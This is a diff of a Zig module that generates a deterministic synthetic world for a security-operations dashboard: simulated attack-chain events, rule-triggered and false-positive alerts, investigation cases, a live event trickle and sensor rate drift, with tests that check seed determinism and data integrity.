+            const user: u16 = @intCast(r.intRangeAtMost(usize, 0, 9));
+            var ts = start;
+            var parent: ?u64 = null;
+            const evil = evil_domains[ci % evil_domains.len];
+            for (chain) |st| {
+                ts += @as(i64, st.gap_min) * std.time.ms_per_min + @as(i64, r.intRangeAtMost(u32, 0, 40_000));
+                var e: domain.Event = .{
+                    .id = self.next_event_id,
+                    .ts_ms = ts,
+                    .kind = st.kind,
+                    .severity = st.sev,
+                    .host = host,
+                    .user = user,
+                    .sensor = switch (st.kind) {
+                        .network, .dns => 2,
+                        else => @as(u16, if (host >= 16) 1 else 0),
+                    },
+                    .parent = parent,
+                    .technique = tidOf(st.tid),
+                    .process = domain.FixedStr(64).from(st.proc),
+                };
+                self.next_event_id += 1;
+                // %u / %evil% substitution in canned cmdlines.
+                if (std.mem.indexOf(u8, st.cmdline, "%u")) |_| {
+                    var tmp: [200]u8 = undefined;
+                    const n = std.mem.replace(u8, st.cmdline, "%u", store.userName(user), &tmp);
+                    _ = n;
+                    const out_len = st.cmdline.len - 2 + store.userName(user).len;
+                    e.cmdline = domain.FixedStr(160).from(tmp[0..@min(out_len, 160)]);
+                } else if (std.mem.indexOf(u8, st.cmdline, "%evil%")) |_| {
+                    var tmp: [220]u8 = undefined;
+                    _ = std.mem.replace(u8, st.cmdline, "%evil%", evil, &tmp);
+                    const out_len = st.cmdline.len - 6 + evil.len;
+                    e.cmdline = domain.FixedStr(160).from(tmp[0..@min(out_len, 160)]);
+                } else {
+                    e.cmdline = domain.FixedStr(160).from(st.cmdline);
+                }
+                if (st.evil_net) {
+                    e.dst_ip = domain.FixedStr(46).fromFmt("{d}.{d}.{d}.{d}", .{ r.intRangeAtMost(u8, 45, 195), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 1, 254) });
+                    const beacon_ports = [_]u16{ 443, 8443, 443 };
+                    e.dst_port = if (st.kind == .dns) 53 else beacon_ports[r.intRangeAtMost(usize, 0, beacon_ports.len - 1)];
+                }
+                try store.events.append(alloc, e);
+                parent = e.id;
+            }
+        }
+    }
+
+    fn buildAlerts(self: *Generator, store: *Store) !void {
+        const alloc = store.allocator;
+        // 1) True positives: every technique-tagged event ≥ medium fires its
+        //    matching (enabled/testing) rule.
+        for (store.events.items) |*e| {
+            const tid = e.technique orelse continue;
+            if (@intFromEnum(e.severity) < @intFromEnum(domain.Severity.medium)) continue;
+            var rule_idx: ?u16 = null;
+            for (store.rules.items) |*rl| {
+                if (rl.technique == tid and rl.status != .disabled) {
+                    rule_idx = rl.id;
+                    break;
+                }
+            }
+            const rid = rule_idx orelse continue;
+            const rl = &store.rules.items[rid];
+            var a: domain.Alert = .{
+                .id = self.next_alert_id,
+                .ts_ms = e.ts_ms + 1500,
+                .rule = rid,
+                .severity = rl.severity,
+                .technique = tid,
+                .title = domain.FixedStr(96).from(rl.name.slice()),
+                .entity = domain.FixedStr(64).fromFmt("{s} \u{00B7} {s}", .{ store.hostName(e.host), store.userName(e.user) }),
+            };
+            self.next_alert_id += 1;
+            a.event_ids[0] = e.id;
+            a.event_count = 1;
+            try store.alerts.append(alloc, a);
+        }
+
+        // 2) FP noise from the noisy rules against benign events, spread
+        //    over the window — the tuning panel's raw material.
+        const fp_total: usize = 85;
+        var i: usize = 0;
+        while (i < fp_total) : (i += 1) {
+            const r = self.rand();
+            // Pick a noisy rule.
+            var noisy_ids: [16]u16 = undefined;
+            var noisy_n: usize = 0;
+            for (rule_defs, 0..) |rd, ri| {
+                if (rd.noisy and noisy_n < noisy_ids.len) {
+                    noisy_ids[noisy_n] = @intCast(ri);
+                    noisy_n += 1;
+                }
+            }
+            const rid = noisy_ids[r.intRangeAtMost(usize, 0, noisy_n - 1)];
+            const rl = &store.rules.items[rid];
+            if (rl.status == .disabled) continue;
+            const ev = &store.events.items[r.intRangeAtMost(usize, 0, store.events.items.len - 1)];
+            var a: domain.Alert = .{
+                .id = self.next_alert_id,
+                .ts_ms = ev.ts_ms + 900,
+                .rule = rid,
+                .severity = rl.severity,
+                .technique = rl.technique,
+                .title = domain.FixedStr(96).from(rl.name.slice()),
+                .entity = domain.FixedStr(64).fromFmt("{s} \u{00B7} {s}", .{ store.hostName(ev.host), store.userName(ev.user) }),
+            };
+            self.next_alert_id += 1;
+            a.event_ids[0] = ev.id;
+            a.event_count = 1;
+            // Most FP noise is already triaged — realistic queue shape.
+            const roll = r.intRangeAtMost(u8, 0, 9);
+            a.status = if (roll < 5) .false_positive else if (roll < 7) .resolved else .new;
+            if (a.status != .new) a.assignee = domain.FixedStr(24).from(analyst_pool[r.intRangeAtMost(usize, 0, 2)]);
+            try store.alerts.append(alloc, a);
+        }
+
+        // Sort alerts newest-last (panels sort their own views).
+        std.mem.sort(domain.Alert, store.alerts.items, {}, struct {
+            fn less(_: void, a: domain.Alert, b: domain.Alert) bool {
+                return a.ts_ms < b.ts_ms;
+            }
+        }.less);
+    }
+
+    fn buildCases(self: *Generator, store: *Store) !void {
+        const alloc = store.allocator;
+        const r = self.rand();
+        // One case per chain: gather that chain's alerts via technique set +
+        // shared host entity of the chain's first event.
+        for (chains, 0..) |chain, ci| {
+            var c: domain.Case = .{
+                .id = @intCast(ci + 1),
+                .title = domain.FixedStr(96).from(chain_case_titles[ci]),
+                .severity = .critical,
+                .status = switch (ci) {
+                    0 => .active,
+                    1 => .contained,
+                    2 => .open,
+                    else => .active,
+                },
+                .assignee = domain.FixedStr(24).from(analyst_pool[ci % 3]),
+                .notes = domain.FixedStr(480).fromFmt("Scoping in progress. {d}-stage chain; oldest indicator inside the 26h window. Next: host isolation decision + credential reset sweep.", .{chain.len}),
+            };
+            // Link alerts whose technique matches any chain stage (first hit
+            // per stage keeps the case tight).
+            for (chain) |st| {
+                const tid = tidOf(st.tid);
+                for (store.alerts.items) |*a| {
+                    if (a.case_id != null or a.technique == null) continue;
+                    if (a.technique.? != tid) continue;
+                    if (c.alert_count >= domain.CASE_ALERT_CAP) break;
+                    a.case_id = c.id;
+                    if (a.status == .new) a.status = .investigating;
+                    if (a.assignee.len == 0) a.assignee = c.assignee;
+                    c.alert_ids[c.alert_count] = a.id;
+                    c.alert_count += 1;
+                    break;
+                }
+            }
+            // Case timestamps track its alerts.
+            var opened: i64 = self.base_ms;
+            var updated: i64 = 0;
+            for (c.alert_ids[0..c.alert_count]) |aid| {
+                if (store.alertById(aid)) |a| {
+                    opened = @min(opened, a.ts_ms);
+                    updated = @max(updated, a.ts_ms);
+                }
+            }
+            c.opened_ms = opened;
+            c.updated_ms = if (updated > 0) updated else opened;
+            try store.cases.append(alloc, c);
+        }
+        // Misc cases (tuning follow-ups, closed history).
+        const misc = [_]struct { title: []const u8, sev: domain.Severity, status: domain.CaseStatus }{
+            .{ .title = "Noisy rule review: browser cred-store FPs", .sev = .low, .status = .open },
+            .{ .title = "Degraded sensor: aws-cloudtrail ingest lag", .sev = .medium, .status = .active },
+            .{ .title = "Password-spray source blocked at perimeter", .sev = .medium, .status = .closed },
+            .{ .title = "Phish wave 06-28 — mailbox purge complete", .sev = .low, .status = .closed },
+        };
+        for (misc, 0..) |m, i| {
+            const opened = self.base_ms - @as(i64, r.intRangeAtMost(u32, 4, 120)) * std.time.ms_per_hour;
+            try store.cases.append(alloc, .{
+                .id = @intCast(chains.len + i + 1),
+                .title = domain.FixedStr(96).from(m.title),
+                .severity = m.sev,
+                .status = m.status,
+                .assignee = domain.FixedStr(24).from(analyst_pool[(i + 1) % 3]),
+                .opened_ms = opened,
+                .updated_ms = opened + @as(i64, r.intRangeAtMost(u32, 1, 40)) * std.time.ms_per_hour,
+                .notes = domain.FixedStr(480).from("See linked alerts + LOG excerpts."),
+            });
+        }
+    }
+
+    /// Live trickle: expected ~0.35 events/s (diurnal-weighted), the odd
+    /// alert, sensor eps jitter. Call once per frame with wall-clock ms.
+    pub fn tick(self: *Generator, store: *Store, now_ms: i64) void {
+        const dt_ms = now_ms - self.last_tick_ms;
+        if (dt_ms < 250) return; // throttle: 4 Hz is plenty for a trickle
+        self.last_tick_ms = now_ms;
+
+        const hour_of_day = @as(f32, @floatFromInt(@mod(@divFloor(now_ms, std.time.ms_per_hour), 24)));
+        const rate_per_s = 0.35 * diurnal(hour_of_day) * 1.4;
+        self.tick_carry += rate_per_s * @as(f32, @floatFromInt(dt_ms)) / 1000.0;
+
+        var appended = false;
+        while (self.tick_carry >= 1.0) : (self.tick_carry -= 1.0) {
+            const e = self.benignEvent(store, now_ms);
+            store.events.append(store.allocator, e) catch break;
+            appended = true;
+            // ~4% of trickle events fire a noisy rule as a NEW alert.
+            const r = self.rand();
+            if (r.intRangeAtMost(u8, 0, 24) == 0) {
+                var noisy_ids: [16]u16 = undefined;
+                var noisy_n: usize = 0;
+                for (rule_defs, 0..) |rd, ri| {
+                    if (rd.noisy and noisy_n < noisy_ids.len) {
+                        noisy_ids[noisy_n] = @intCast(ri);
+                        noisy_n += 1;
+                    }
+                }
+                const rid = noisy_ids[r.intRangeAtMost(usize, 0, noisy_n - 1)];
+                const rl = &store.rules.items[rid];
+                if (rl.status == .enabled) {
+                    var a: domain.Alert = .{
+                        .id = self.next_alert_id,
+                        .ts_ms = now_ms,
+                        .rule = rid,
+                        .severity = rl.severity,
+                        .technique = rl.technique,
+                        .title = domain.FixedStr(96).from(rl.name.slice()),
+                        .entity = domain.FixedStr(64).fromFmt("{s} \u{00B7} {s}", .{ store.hostName(e.host), store.userName(e.user) }),
+                    };
+                    self.next_alert_id += 1;
+                    a.event_ids[0] = e.id;
+                    a.event_count = 1;
+                    store.alerts.append(store.allocator, a) catch {};
+                    rl.fires_7d += 1;
+                }
+            }
+        }
+
+        // Sensor eps drift every ~2 s.
+        if (@mod(@divFloor(now_ms, 1000), 2) == 0) {
+            const r = self.rand();
+            for (store.sensors.items) |*s| {
+                if (s.status == .down) continue;
+                s.eps = @max(1.0, s.eps * (0.97 + r.float(f32) * 0.06));
+                s.last_seen_ms = now_ms;
+            }
+        }
+        if (appended) store.touch();
+    }
+
+    /// FNV-1a over the world's identity-bearing fields — the determinism
+    /// contract check ("same seed ⇒ identical world").
+    pub fn checksum(store: *const Store) u64 {
+        var h: u64 = 0xcbf29ce484222325;
+        const step = struct {
+            fn mix(hash: *u64, bytes: []const u8) void {
+                for (bytes) |b| {
+                    hash.* ^= b;
+                    hash.* *%= 0x100000001b3;
+                }
+            }
+        };
+        for (store.events.items) |*e| {
+            step.mix(&h, std.mem.asBytes(&e.id));
+            step.mix(&h, std.mem.asBytes(&e.ts_ms));
+            step.mix(&h, e.process.slice());
+            step.mix(&h, e.cmdline.slice());
+        }
+        for (store.alerts.items) |*a| {
+            step.mix(&h, std.mem.asBytes(&a.id));
+            step.mix(&h, a.title.slice());
+            step.mix(&h, a.entity.slice());
+        }
+        for (store.iocs.items) |*ic| step.mix(&h, ic.value.slice());
+        return h;
+    }
+};
+
+test "same seed => identical world; different seed => different world" {
+    const base: i64 = 1_750_000_000_000;
+    var s1 = Store.init(std.testing.allocator);
+    defer s1.deinit();
+    var g1 = Generator.init(42, base);
+    try g1.build(&s1);
+
+    var s2 = Store.init(std.testing.allocator);
+    defer s2.deinit();
+    var g2 = Generator.init(42, base);
+    try g2.build(&s2);
+
+    try std.testing.expectEqual(s1.events.items.len, s2.events.items.len);
+    try std.testing.expectEqual(s1.alerts.items.len, s2.alerts.items.len);
+    try std.testing.expectEqual(Generator.checksum(&s1), Generator.checksum(&s2));
+
+    var s3 = Store.init(std.testing.allocator);
+    defer s3.deinit();
+    var g3 = Generator.init(7, base);
+    try g3.build(&s3);
+    try std.testing.expect(Generator.checksum(&s1) != Generator.checksum(&s3));
+}
+
+test "world shape sane" {
+    var s = Store.init(std.testing.allocator);
+    defer s.deinit();
+    var g = Generator.init(42, 1_750_000_000_000);
+    try g.build(&s);
+
+    try std.testing.expect(s.events.items.len > 2000);
+    try std.testing.expect(s.alerts.items.len > 60);
+    try std.testing.expect(s.cases.items.len == 8);
+    try std.testing.expect(s.rules.items.len == rule_defs.len);
+    try std.testing.expect(s.iocs.items.len >= 600);
+
+    // Every alert references a live rule + event; chain cases link alerts.
+    for (s.alerts.items) |*a| {
+        try std.testing.expect(a.rule < s.rules.items.len);
+        try std.testing.expect(s.eventById(a.event_ids[0]) != null);
+    }
+    var linked: usize = 0;
+    for (s.cases.items) |*c| linked += c.alert_count;
+    try std.testing.expect(linked >= 8);
+
+    // Process-tree integrity: every parent link resolves.
+    for (s.events.items) |*e| {
+        if (e.parent) |p| try std.testing.expect(s.eventById(p) != null);
+    }
+}
